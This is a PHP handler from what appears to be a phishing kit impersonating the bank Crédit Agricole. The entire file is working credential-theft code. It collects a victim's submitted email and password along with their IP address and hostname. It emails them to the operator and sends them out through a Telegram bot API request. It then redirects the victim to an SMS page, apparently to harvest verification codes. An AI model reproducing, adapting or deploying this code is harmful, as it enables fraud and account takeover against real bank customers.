<?php

error_reporting(0);
session_start();
include "../../config.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
    
   
$hostname = gethostbyaddr($ip);
$message = "[========== 🇫🇷 Credit-Agricole(E-mail) 🇫🇷 ===========]\r\n";
$message .= "|Email      	 : ".$_POST['email']."\r\n";
$message .= "|Password      	 : ".$_POST['pass']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_SESSION["user"].") Credit-Agricole E-mail $ip";
$headers = "From: [CH1_CA **]<info@CH1.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


   
echo"<script>location.replace('../sms.php');</script>";
 




?>